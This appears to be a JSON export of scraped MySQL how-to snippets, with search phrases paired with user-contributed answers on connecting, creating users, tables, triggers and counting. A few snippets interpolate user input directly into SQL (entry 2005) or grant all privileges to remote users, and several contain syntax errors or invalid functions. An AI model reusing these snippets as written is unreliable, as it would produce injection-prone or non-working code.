    "id": 1999,
    "keyword": null,
    "link": null,
    "title": " mysql command line see all databases",
    "description": "SHOW DATABASES;\n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 2000,
    "keyword": null,
    "link": null,
    "title": " mysql command line xampp ubuntu",
    "description": "/opt/lampp/bin/mysql -u root\ncd c:\\xampp\\mysql\\bin mysql.exe -u root --password \n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2001,
    "keyword": null,
    "link": null,
    "title": " mysql command show tables",
    "description": "show tables; \nSHOW TABLES;\n# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2002,
    "keyword": null,
    "link": null,
    "title": " mysql comment",
    "description": "-- This is a SQL Comment  /*  This is a multi-line SQL comment  */\nmysql> SELECT 1+1;     # This comment continues to the end of line mysql> SELECT 1+1;     -- This comment continues to the end of line mysql> SELECT 1 /* this is an in-line comment */ + 1; mysql> SELECT 1+ /* this is a multiple-line comment */ 1;\n#this is a comment -- this is a comment but requires a whitespace/tab/newline after the double -\nmysql comments\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2003,
    "keyword": null,
    "link": null,
    "title": " mysql community server",
    "description": "/* Answer to: \"mysql community server\" */  /*   MySQL is an open-source relational database management system. Its   name is a combination of \"My\", the name of co-founder Michael   Widenius's daughter, and \"SQL\", the abbreviation for Structured   Query Language.      To download the community server application go to:   https://dev.mysql.com/downloads/mysql/ */\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2004,
    "keyword": null,
    "link": null,
    "title": " mysql compare datetime to another datetime",
    "description": "Select * From temp where mydate > '2009-06-29 04:00:44';\nSelect * From temp where mydate > STR_TO_DATE('2009-06-29 04:00:44', '%Y-%m-%d %H:%i:%s');\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2005,
    "keyword": null,
    "link": null,
    "title": " mysql concat and use as where column",
    "description": "select * from table where concat_ws(' ',first_name,last_name)  like '%$search_term%';\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2006,
    "keyword": null,
    "link": null,
    "title": " mysql concatenate select results",
    "description": "SELECT person_id, GROUP_CONCAT(hobbies SEPARATOR ', ') FROM peoples_hobbies GROUP BY person_id; \n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2007,
    "keyword": null,
    "link": null,
    "title": " mysql concatenate two columns into one",
    "description": "SELECT CONCAT(first_name, ' ', last_name) AS 'Name', dept FROM users; \nSELECT concat(first_column, ' ', second_column) from table_name\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2008,
    "keyword": null,
    "link": null,
    "title": " mysql connect command",
    "description": "mysql.exe &ndash;uroot &ndash;p\nmysql --host=localhost --user=myname --password mydb mysql -h localhost -u myname -p mydb\nmysql --host=localhost --port=myport --user=myname --password mysql -h localhost -u myname -p --port=myport\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2009,
    "keyword": null,
    "link": null,
    "title": " mysql connection string",
    "description": "Server=myServerAddress;Port=1234;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=serverAddress1, serverAddress2, serverAddress3;Database=myDataBase;Uid=myUsername;Pwd=myPassword; Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;Encrypt=true;\nPress CTRL+C to copy \"server=127.0.0.1;uid=root;pwd=12345;database=test\"\nServer=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;\n",
    "reg_date": "2021-10-12T09:56:59.000Z"
  },
  {
    "id": 2010,
    "keyword": null,
    "link": null,
    "title": " mysql connector/python query example",
    "description": "Press CTRL+C to copy import datetime import mysql.connector  cnx = mysql.connector.connect(user='scott', database='employees') cursor = cnx.cursor()  query = (\"SELECT first_name, last_name, hire_date FROM employees \"          \"WHERE hire_date BETWEEN %s AND %s\")  hire_start = datetime.date(1999, 1, 1) hire_end = datetime.date(1999, 12, 31)  cursor.execute(query, (hire_start, hire_end))  for (first_name, last_name, hire_date) in cursor:   print(\"{}, {} was hired on {:%d %b %Y}\".format(     last_name, first_name, hire_date))  cursor.close() cnx.close()\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2011,
    "keyword": null,
    "link": null,
    "title": " mysql connector in flask",
    "description": "from flask import Flask, render_template, request from flask_mysqldb import MySQL app = Flask(__name__)   app.config['MYSQL_HOST'] = 'localhost' app.config['MYSQL_USER'] = 'root' app.config['MYSQL_PASSWORD'] = 'root' app.config['MYSQL_DB'] = 'MyDB'  mysql = MySQL(app)   @app.route('/', methods=['GET', 'POST']) def index():     if request.method == \"POST\":         details = request.form         firstName = details['fname']         lastName = details['lname']         cur = mysql.connection.cursor()         cur.execute(\"INSERT INTO MyUsers(firstName, lastName) VALUES (%s, %s)\", (firstName, lastName))         mysql.connection.commit()         cur.close()         return 'success'     return render_template('index.html')   if __name__ == '__main__':     app.run() \nfrom flask import Flask, render_template, request from flask_mysqldb import MySQL app = Flask(__name__)   app.config['MYSQL_HOST'] = 'localhost' app.config['MYSQL_USER'] = 'root' app.config['MYSQL_PASSWORD'] = 'root' app.config['MYSQL_DB'] = 'MyDB'  mysql = MySQL(app)   @app.route('/', methods=['GET', 'POST']) def index():     if request.method == \"POST\":         details = request.form         firstName = details['fname']         lastName = details['lname']         cur = mysql.connection.cursor()         cur.execute(\"INSERT INTO MyUsers(firstName, lastName) VALUES (%s, %s)\", (firstName, lastName))         mysql.connection.commit()         cur.close()         return 'success'     return render_template('index.html')   if __name__ == '__main__':     app.run()\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2012,
    "keyword": null,
    "link": null,
    "title": " mysql connector python",
    "description": "pip3 install mysql-connector-python  #Python 3 pip install mysql-connector-python \n# real nice guide, as well as instalation guide: https://pynative.com/python-mysql-database-connection/ # pip install mysql-connector-python import mysql.connector from mysql.connector import Error  try:     connection = mysql.connector.connect(host='localhost',                                          database='Electronics',                                          user='pynative',                                          password='pynative@#29')     if connection.is_connected():         db_Info = connection.get_server_info()         print(\"Connected to MySQL Server version \", db_Info)         cursor = connection.cursor()         cursor.execute(\"select database();\")         record = cursor.fetchone()         print(\"You're connected to database: \", record)  except Error as e:     print(\"Error while connecting to MySQL\", e) finally:     if (connection.is_connected()):         cursor.close()         connection.close()         print(\"MySQL connection is closed\")\nimport mysql.connector  cnx = mysql.connector.connect(user='scott', password='password',                               host='127.0.0.1',                               database='employees') cnx.close()\nimport mysql.connector  mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\" )  print(mydb)\nPress CTRL+C to copy import datetime import mysql.connector  cnx = mysql.connector.connect(user='scott', database='employees') cursor = cnx.cursor()  query = (\"SELECT first_name, last_name, hire_date FROM employees \"          \"WHERE hire_date BETWEEN %s AND %s\")  hire_start = datetime.date(1999, 1, 1) hire_end = datetime.date(1999, 12, 31)  cursor.execute(query, (hire_start, hire_end))  for (first_name, last_name, hire_date) in cursor:   print(\"{}, {} was hired on {:%d %b %Y}\".format(     last_name, first_name, hire_date))  cursor.close() cnx.close()\nimport mysql.connector try:     connection = mysql.connector.connect(host='localhost',database='dbname',user='root',password='xxxxx')     # print(dir(connection))     # print(connection.connection_id)     if connection.is_connected():         db_Info = connection.get_server_info()         print(\"Connected to MySQL Server version \", db_Info)         cursor = connection.cursor()         cursor.execute(\"select database();\")         record = cursor.fetchone()         print(\"You're connected to database: \", record) except Error as e:     print(\"except\")     print(\"Error while connecting to MySQL\", e) finally:     if (connection.is_connected()):         cursor.close()         connection.close()         print(\"MySQL connection is closed\")\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2013,
    "keyword": null,
    "link": null,
    "title": " mysql convert column to uppercase",
    "description": "UPDATE my_table SET my_column = UPPER(my_column)\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2014,
    "keyword": null,
    "link": null,
    "title": " mysql convert timestamp to date",
    "description": " DATE_FORMAT(FROM_UNIXTIME(`timestamp`), '%Y-%m-%d') AS 'send_date',  %H:%i:%s\n-- Use the FROM_UNIXTIME() function in MySQL select from_unixtime(timestamp) from my_tbl;\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2015,
    "keyword": null,
    "link": null,
    "title": " mysql copy table1 to table2",
    "description": "INSERT INTO TARGET_TABLE (`col1_`,`col2_`) SELECT `col1`,`col2` FROM SOURCE_TABLE WHERE `foo`=1 \n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2016,
    "keyword": null,
    "link": null,
    "title": " mysql copy table to another table",
    "description": "CREATE TABLE new_table  SELECT col1, col2, col3  FROM     existing_table WHERE     conditions;\nINSERT INTO table2 (st_id,uid,changed,status,assign_status) SELECT st_id,from_uid,now(),'Pending','Assigned' FROM table1 \n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2017,
    "keyword": null,
    "link": null,
    "title": " mysql copy table with new name",
    "description": "                                     CREATE TABLE IF NOT EXISTS new_table LIKE existing_table;  INSERT new_table SELECT * FROM existing_table;\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2018,
    "keyword": null,
    "link": null,
    "title": " mysql count all table rows",
    "description": "SELECT COUNT(*) FROM count_demos; // Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2019,
    "keyword": null,
    "link": null,
    "title": " mysql count grouped rows",
    "description": "SELECT DISTINCT my_field, COUNT(*) FROM my_table GROUP BY my_field;  -- Count of grouped rows: SELECT COUNT(*) FROM (   SELECT DISTINCT my_field FROM my_table );\n",
    "reg_date": "2021-10-12T09:57:00.000Z"
  },
  {
    "id": 2020,
    "keyword": null,
    "link": null,
    "title": " mysql count multiple columns in one query",
    "description": "SELECT \tGROUP_CONCAT(DISTINCT id SEPARATOR ', ') AS 'ids' FROM \ttable_name WHERE \tcolumn_name = 'value'\nmysql count multiple columns in one query:  SELECT          count(*)             as count_rows,         count(col1)          as count_1,         count(col2)          as count_2,         count(distinct col1) as count_distinct_1,         count(distinct col2) as count_distinct_2,         count(distinct col1, col2) as count_distinct_1_2     FROM `table` ;\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2021,
    "keyword": null,
    "link": null,
    "title": " mysql count newlines in field",
    "description": "select LENGTH(my_column)-LENGTH(REPLACE(my_column, '\\n', '')) as total_new_lines\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2022,
    "keyword": null,
    "link": null,
    "title": " mysql count number of occurrences in a column",
    "description": "SELECT name,COUNT(*)  FROM tablename  GROUP BY name  ORDER BY COUNT(*) DESC;\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2023,
    "keyword": null,
    "link": null,
    "title": " mysql count rows returned",
    "description": "SELECT COUNT(*) FROM my_table; SELECT COUNT(*) FROM my_table WHERE my_column IS NULL; SELECT COUNT(*) FROM my_table WHERE my_column = 'my_value'; SELECT COUNT(DISTINCT tel) gender_count,        COUNT(DISTINCT CASE WHEN gender = 'male'   THEN tel END) male_count,        COUNT(DISTINCT CASE WHEN gender = 'female' THEN tel END) female_count FROM people;\n SELECT * FROM `your_table` LIMIT 0, 5000  \nselect count(*) from (select * from foo) as x;\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2024,
    "keyword": null,
    "link": null,
    "title": " mysql count table rows",
    "description": "select table_name, sum(table_rows) as sum  from information_schema.tables where table_schema = '[DB NAME]' group by table_name  order by sum desc;\nSELECT sum( case when `tags_Column` CONTAINS 'tag2' then 1 else 0 end ) as tag2,        sum( case when `tags_Column` CONTAINS 'tag3' then 1 else 0 end ) as tag3,        .....        sum( case when `tags_Column` CONTAINS 'tag256' then 1 else 0 end ) as tag256,        sum( case when `tags_Column` CONTAINS `tag2` OR                        `tags_Column` CONTAINS 'tag3`             then 0 else 1 end ) as doesnt_contains_tags_2_3 FROM `TableContainsTags`\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2025,
    "keyword": null,
    "link": null,
    "title": " mysql count vs sum",
    "description": "+----+------+ | id | vote | +----+------+ |  1 |    1 |       COUNT(vote) = 5  |  2 |   -1 |\t\tSUM(vote) = 1  = (-2 + 3 = 1) |  3 |    1 |\t\t\t   |  4 |   -1 |\t#Sum is doing the mathematical sum, whereas count simply  |  5 |    1 |\t#counts any value as 1 regardless of what data type. +----+------+  /** The first query returns the number of times the condition is true, because true is 1 and false is 0. The second query returns the complete record count because count() does not care about the content inside it, as long as the content is NOT NULL. Because count(1) and count(0) are still values and both get counted. To get the correct return value for the second query you would have to make the result of the condition be null (instead of 0) to not being counted. Like this: */ SELECT COUNT(case when USER_NAME = 'JoeBlow' then 'no matter what' else NULL end)  from your_table\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2026,
    "keyword": null,
    "link": null,
    "title": " mysql count words",
    "description": "SELECT description, LENGTH(TRIM(description)) - LENGTH(REPLACE(TRIM(description), ' ', '')) + 1 FROM test.city\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2027,
    "keyword": null,
    "link": null,
    "title": " mysql create a user",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'norris'@'localhost' IDENTIFIED BY 'password';\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; \n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!\nCREATE USER 'someusername'@'localhost' IDENTIFIED BY 'password'\n",
    "reg_date": "2021-10-12T09:57:01.000Z"
  },
  {
    "id": 2028,
    "keyword": null,
    "link": null,
    "title": " mysql create database charset utf8mb4",
    "description": "CREATE DATABASE mydatabase CHARACTER SET utf8 COLLATE utf8_general_ci;\nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2029,
    "keyword": null,
    "link": null,
    "title": " mysql create database utf8",
    "description": "CREATE DATABASE mydatabase CHARACTER SET utf8 COLLATE utf8_general_ci;\nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;\nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2030,
    "keyword": null,
    "link": null,
    "title": " mysql create function",
    "description": "-- MySQL  -- example DELIMITER $$ CREATE FUNCTION f_employee_count(p_dept_no INTEGER) RETURNS INTEGER   DETERMINISTIC NO SQL READS SQL DATA   BEGIN     DECLARE v_emp_count INTEGER;      SELECT COUNT(*)     INTO v_emp_count     FROM EMPLOYEES E     WHERE E.DEPT_NO = p_dept_no     GROUP BY DEPARTMENT_NO;      RETURN v_emp_count; END$$ DELIMITER ;  /* syntax: DELIMITER $$ CREATE FUNCTION <Your-procedure-name>(<arguments>) RETURNS <date-type>   DETERMINISTIC NO SQL READS SQL DATA   BEGIN       DECLARE <variable-name> <data-type>        <Code-that-sets-the-output-variable>;         RETURN <variable-name>; END$$ DELIMITER ; */\nRETURN result;\n// created function checkTags CREATE FUNCTION `data-management`.checkTags(tags text) RETURNS text DETERMINISTIC BEGIN return tags ; END   // queries  according to it SELECT * FROM `data-management`.properties p WHERE `data-management`.checkTags(p.tags = 'tag1,absntee')\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2031,
    "keyword": null,
    "link": null,
    "title": " mysql create stored procedure",
    "description": "-- MySQL  -- example DELIMITER $$ -- Changes delimiter to $$ so can use ; within the procedure CREATE PROCEDURE select_employees() BEGIN \tselect *  \tfrom employees  \tlimit 1000; -- Use the ; symbol within the procedure END$$  DELIMITER ; -- Resets the delimiter  /* syntax: DELIMITER $$ -- Changes delimiter to $$ so can use ; within the procedure CREATE PROCEDURE <Your-procedure-name>(<argument1><argument2>...<argumentN>) BEGIN \t<Code-that-stored-procedure-executes>; -- Use the ; symbol within the procedure END$$ DELIMITER ; -- Resets the delimiter */\nDELIMITER $$  CREATE PROCEDURE GetCustomers() BEGIN \tSELECT  \t\tcustomerName,  \t\tcity,  \t\tstate,  \t\tpostalCode,  \t\tcountry \tFROM \t\tcustomers \tORDER BY customerName;     END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL GetCustomers(); \nDELIMITER $$  CREATE PROCEDURE GetAllProducts() BEGIN \tSELECT *  FROM products; END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL GetAllProducts(); \n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2032,
    "keyword": null,
    "link": null,
    "title": " mysql create table",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE IF NOT EXISTS tasks (     task_id INT AUTO_INCREMENT PRIMARY KEY,     title VARCHAR(255) NOT NULL,     start_date DATE,     due_date DATE,     status TINYINT NOT NULL,     priority TINYINT NOT NULL,     description TEXT,     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )  ENGINE=INNODB; \nImaginons que l&rsquo;ont souhaite cr&eacute;er une table utilisateur, contenant \"id\",\"nom\", \"prenom\", \"email\", \"date_naiss\", \"pays\" etc.. La requ&ecirc;te pour cr&eacute;er cette table peut ressembler &agrave; ceci:  CREATE TABLE utilisateur (     id INT PRIMARY KEY NOT NULL,     nom VARCHAR(100),     prenom VARCHAR(100),     email VARCHAR(255),     date_naissance DATE,     pays VARCHAR(255),     ville VARCHAR(255),     code_postal VARCHAR(5),     nombre_achat INT )  Voici des explications sur les colonnes cr&eacute;&eacute;es :      id : identifiant unique qui est utilis&eacute; comme cl&eacute; primaire \t\t et qui n&rsquo;est pas nulle     nom :une colonne de type VARCHAR avec un maximum de 100 caract&egrave;res      prenom : idem mais pour le pr&eacute;nom     email : adresse email enregistr&eacute; sous 255 caract&egrave;res au maximum     date_naissance :  format AAAA-MM-JJ (exemple : 1973-11-17)     pays : nom du pays  255 caract&egrave;res au maximum     ville : idem pour la ville     code_postal : 5 caract&egrave;res du code postal     nombre_achat : nombre d&rsquo;achat de cet utilisateur sur le site\nThe CREATE TABLE statement allows you to create a new table in a database.  The following illustrates the basic syntax of the CREATE TABLE  statement:  CREATE TABLE [IF NOT EXISTS] table_name(    column_1_definition,    column_2_definition,    ...,    table_constraints ) ENGINE=storage_engine; Let&rsquo;s examine the syntax in greater detail.  First, you specify the name of the table that you want to create after the CREATE TABLE  keywords. The table name must be unique within a database. The IF NOT EXISTS is optional. It allows you to check if the table that you create already exists in the database. If this is the case, MySQL will ignore the whole statement and will not create any new table.  Second, you specify a list of columns of the table in the column_list section, columns are separated by commas.  Third, you can optionally specify the storage engine for the table in the ENGINE clause. You can use any storage engine such as InnoDB and MyISAM. If you don&rsquo;t explicitly declare a storage engine, MySQL will use InnoDB by default.\nCREATE TABLE nom_de_la_table (     colonne1 type_donnees,     colonne2 type_donnees,     colonne3 type_donnees,     colonne4 type_donnees )\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2033,
    "keyword": null,
    "link": null,
    "title": " mysql create table columns with spaces",
    "description": "# Use backticks CREATE TABLE info (`Full Names` varchar(20), ...)\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2034,
    "keyword": null,
    "link": null,
    "title": " mysql create table if not exists",
    "description": "                                     CREATE TABLE IF NOT EXISTS checklists (     todo_id INT AUTO_INCREMENT,     task_id INT,     todo VARCHAR(255) NOT NULL,     is_completed BOOLEAN NOT NULL DEFAULT FALSE,     PRIMARY KEY (todo_id , task_id),     FOREIGN KEY (task_id)         REFERENCES tasks (task_id)         ON UPDATE RESTRICT ON DELETE CASCADE );Code language: SQL (Structured Query Language) (sql)\nCREATE TABLE [IF NOT EXISTS] tbl_name     (create_definition,...)     [table_options]     [partition_options] \nCREATE TABLE [IF NOT EXISTS] table_name(    column_1_definition,    column_2_definition,    ...,    table_constraints ) ENGINE=storage_engine;\nCREATE TABLE nom_de_la_table (     colonne1 type_donnees,     colonne2 type_donnees,     colonne3 type_donnees,     colonne4 type_donnees )\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2035,
    "keyword": null,
    "link": null,
    "title": " mysql create table if not exists example",
    "description": "                                     CREATE TABLE IF NOT EXISTS checklists (     todo_id INT AUTO_INCREMENT,     task_id INT,     todo VARCHAR(255) NOT NULL,     is_completed BOOLEAN NOT NULL DEFAULT FALSE,     PRIMARY KEY (todo_id , task_id),     FOREIGN KEY (task_id)         REFERENCES tasks (task_id)         ON UPDATE RESTRICT ON DELETE CASCADE );Code language: SQL (Structured Query Language) (sql)\nCREATE TABLE [IF NOT EXISTS] table_name(    column_1_definition,    column_2_definition,    ...,    table_constraints ) ENGINE=storage_engine;\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2036,
    "keyword": null,
    "link": null,
    "title": " mysql create timestamp column",
    "description": "CURRENT_TIMESTAMP()\nALTER TABLE `table1` ADD `lastUpdated` TIMESTAMP ON UPDATE CURRENT_TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ; \n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2037,
    "keyword": null,
    "link": null,
    "title": " mysql create trigger",
    "description": "-- The following statement creates an AFTER UPDATE trigger on the sales table:  DELIMITER $$  CREATE TRIGGER after_sales_update AFTER UPDATE ON sales FOR EACH ROW BEGIN     IF OLD.quantity <> new.quantity THEN         INSERT INTO SalesChanges(salesId,beforeQuantity, afterQuantity)         VALUES(old.id, old.quantity, new.quantity);     END IF; END$$  DELIMITER ;\nCREATE     TRIGGER `event_name` BEFORE/AFTER INSERT/UPDATE/DELETE     ON `database`.`table`     FOR EACH ROW BEGIN \t\t-- trigger body \t\t-- this code is applied to every  \t\t-- inserted/updated/deleted row     END;      CREATE \tTRIGGER `blog_after_insert` AFTER INSERT  \tON `blog`  \tFOR EACH ROW BEGIN \t \t\tIF NEW.deleted THEN \t\t\tSET @changetype = 'DELETE'; \t\tELSE \t\t\tSET @changetype = 'NEW'; \t\tEND IF;      \t\tINSERT INTO audit (blog_id, changetype) VALUES (NEW.id, @changetype); \t\t     END$$\nCREATE TRIGGER trigger_name {BEFORE | AFTER} {INSERT | UPDATE| DELETE } ON table_name FOR EACH ROW trigger_body;\nCREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n",
    "reg_date": "2021-10-12T09:57:02.000Z"
  },
  {
    "id": 2038,
    "keyword": null,
    "link": null,
    "title": " mysql create unique key via alter table",
    "description": " ALTER TABLE Persons  ADD CONSTRAINT UC_Person UNIQUE (ID,LastName); \n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2039,
    "keyword": null,
    "link": null,
    "title": " mysql create usaer",
    "description": "CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2040,
    "keyword": null,
    "link": null,
    "title": " mysql create user",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'norris'@'localhost' IDENTIFIED BY 'password';\n# First Login mysql shell.. sudo mysql -u root -p  CREATE USER 'username'@'localhost' IDENTIFIED BY 'P4ssW0rd'; GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; #grant permissions to a specic database and/or table  GRANT ALL PRIVILEGES ON database.table TO 'newuser'@'localhost'; #Or grant wildcar permission to any DB/table GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'localhost';\nCreate MYsql USER AND grant access to the database\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2041,
    "keyword": null,
    "link": null,
    "title": " mysql create user with mysql native password",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2042,
    "keyword": null,
    "link": null,
    "title": " mysql create user with remote access",
    "description": "CREATE USER 'myuser'@'%' IDENTIFIED BY 'mypass'; GRANT ALL PRIVILEGES ON *.* TO 'myuser'@'%'; flush privileges;\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2043,
    "keyword": null,
    "link": null,
    "title": " mysql created at yesterdau",
    "description": "SELECT * FROM my_table WHERE created_at > DATE_SUB(NOW(), INTERVAL 1 DAY)\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2044,
    "keyword": null,
    "link": null,
    "title": " mysql current date",
    "description": "You can use CURDATE()\nIn MySQL the CURDATE() returns the current date in 'YYYY-MM-DD' format or 'YYYYMMDD' format depending on whether numeric or string is used in the function. CURRENT_DATE and CURRENT_DATE() are the synonym of CURDATE()\nSELECT NOW(); It returns current date and time.\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2045,
    "keyword": null,
    "link": null,
    "title": " mysql current running queries",
    "description": "show processlist; \n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2046,
    "keyword": null,
    "link": null,
    "title": " mysql current time",
    "description": "CURRENT_TIME return HH:ii:ss format time in mysql\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2047,
    "keyword": null,
    "link": null,
    "title": " mysql current user",
    "description": "-- mysql current user: SELECT USER(); -- or SELECT CURRENT_USER();\n",
    "reg_date": "2021-10-12T09:57:03.000Z"
  },
  {
    "id": 2048,
    "keyword": null,
    "link": null,
    "title": " mysql database create",
    "description": "CREATE DATABASE `mydb`;  CREATE TABLE `my_table` ( \tmy_table_id INT AUTO_INCREMENT,     my_table_name VARCHAR(30) NOT NULL,     my_foreign_key INT NOT NULL,     my_tb_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,   \tmy_tb_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, ,     # Any other properties here     PRIMARY KEY(my_table_id),     CONSTRAINT fk_name_of_parent_table     FOREIGN KEY(my_foreign_key) REFERENCES parent_table(parent_table_column) );  SHOW DATABASES; \nmysql> CREATE DATABASE databaseName;\nCREATE {DATABASE | SCHEMA} [IF NOT EXISTS] db_name     [create_option] ...  create_option: {     [DEFAULT] CHARACTER SET [=] charset_name   | [DEFAULT] COLLATE [=] collation_name }\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2049,
    "keyword": null,
    "link": null,
    "title": " mysql database is not starting in xampp",
    "description": "sudo service mysql stop sudo /opt/lampp/lampp restart \n18   1 If you have MySQL already installed on your windows then go to services.msc file on your windows and right click the MySQL file and stop the service, now open your XAMPP and start MySQL. Now MySQL will start on the port 3306.\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2050,
    "keyword": null,
    "link": null,
    "title": " mysql date - 1 day",
    "description": "select *  from orders  where order_date >= DATE_SUB(NOW(),INTERVAL 1 YEAR);\nSELECT * FROM FOO WHERE MY_DATE_FIELD >= NOW() - INTERVAL 1 DAY\n...WHERE DATE_FIELD >= DATE_SUB(NOW(), INTERVAL 1 DAY) \n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2051,
    "keyword": null,
    "link": null,
    "title": " mysql date between two dates",
